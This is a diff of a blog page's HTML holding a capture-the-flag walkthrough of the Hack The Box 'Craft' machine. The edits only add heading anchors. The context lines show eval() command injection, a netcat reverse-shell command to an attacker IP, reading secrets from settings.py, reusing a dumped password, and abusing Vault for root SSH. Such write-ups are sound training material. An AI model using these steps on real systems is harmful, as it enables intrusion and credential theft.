@@ -16,6 +16,8 @@ $ nmap -sV -sT -sC craft.htb Starting Nmap 7."/>
 <link rel="canonical" href="/posts/craft/" />
 
 
+
+
 <link rel="stylesheet" href="/assets/style.css">
 
   <link rel="stylesheet" href="/assets/green.css">
@@ -172,13 +174,13 @@ $ nmap -sV -sT -sC craft.htb Starting Nmap 7." />
   <img src="/img/craft-hackthebox.png" class="post-cover" />
   
 
-  <div class="post-content">
-    <p>Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.</p>
+  <div class="post-content"><div>
+        <p>Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.</p>
 <p>First thing first, let's add the box IP to the hosts file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 craft.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>and let's start!</p>
-<h1 id="user-flag">User Flag</h1>
-<h2 id="recon">Recon</h2>
+<h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Let's start with the classic nmap scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC craft.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-20 01:26 CEST
@@ -225,7 +227,7 @@ $ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &
 <p>Since we have the code source it will greatly help our investigation. The API is in Python with the Flask framework.</p>
 <p>Let's clone it to check the code more easily :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gogs.craft.htb/Craft/craft-api.git
-</code></pre></div><h2 id="remote-code-execution-on-api">Remote code execution on API</h2>
+</code></pre></div><h2 id="remote-code-execution-on-api">Remote code execution on API<a href="#remote-code-execution-on-api" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be used for command injection. It's the easiest way to land a shell on a box.
 If this search don't give any results I will move on to SQL injection and so on.</p>
 <p>The most common way command injection vulnerability get introduced in Python is by the <code>eval()</code> function which is used to run the python code (which is passed as an argument) within the program.</p>
@@ -373,7 +375,7 @@ nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
     -e PROG    Run PROG after connect (must be last)
    [...]
 </code></pre><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p>
-<h2 id="pivot-from-docker-container-to-user">Pivot from docker container to user</h2>
+<h2 id="pivot-from-docker-container-to-user">Pivot from docker container to user<a href="#pivot-from-docker-container-to-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. From here we won't go far from here.</p>
 <p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app/craft_api <span style="color:#75715e"># cat settings.py</span>
@@ -460,8 +462,8 @@ gilfoyle@craft:~$
 </code></pre></div><p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat user.txt
 bbfxxxxxxxxxxxxxa612d4
-</code></pre></div><h1 id="root">Root</h1>
-<h2 id="recon-1">Recon</h2>
+</code></pre></div><h1 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="recon-1">Recon<a href="#recon-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>On user <code>gilfoyle</code> nothing particulary catch the eye and the box seems well configured. Upon enumeration we still notice an uncommon ssh configuration :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat /etc/ssh/sshd_config
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
@@ -479,7 +481,7 @@ f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 <p>A tool for secrets management, encryption as a service, and privileged access management
 <a href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></p>
 </blockquote>
-<h2 id="exploiting-vault-for-ssh-root-password">Exploiting Vault for SSH root password</h2>
+<h2 id="exploiting-vault-for-ssh-root-password">Exploiting Vault for SSH root password<a href="#exploiting-vault-for-ssh-root-password" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account password or a way to access the root account through ssh.</p>
 <p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
@@ -548,7 +550,7 @@ root@craft:~# cat root.txt
 <p>See you next time !</p>
 <p>-hg8</p>
 
-  </div>
+      </div></div>
   
   <div class="pagination">
     <div class="pagination__title">
